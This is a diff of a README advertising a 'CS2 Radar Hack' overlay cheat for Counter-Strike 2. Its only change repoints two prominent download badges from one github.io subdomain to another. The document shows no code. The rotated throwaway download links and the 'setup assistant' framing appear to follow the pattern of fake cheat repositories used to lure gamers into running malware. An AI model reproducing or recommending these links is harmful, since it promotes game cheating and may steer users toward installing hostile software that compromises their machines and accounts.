@@ -1,7 +1,7 @@
 # 🛰️ CS2 Radar Hack — Tactical Awareness Assistant & 2D Overlay Tool
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-red?style=for-the-badge)](https://cs2radarweb0989.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=counter-strike)](https://cs2radarweb0989.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-red?style=for-the-badge)](https://cs2radarpcweb0.github.io/.github/)  
+[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=counter-strike)](https://cs2radarpcweb0.github.io/.github/)
 
 ---
 
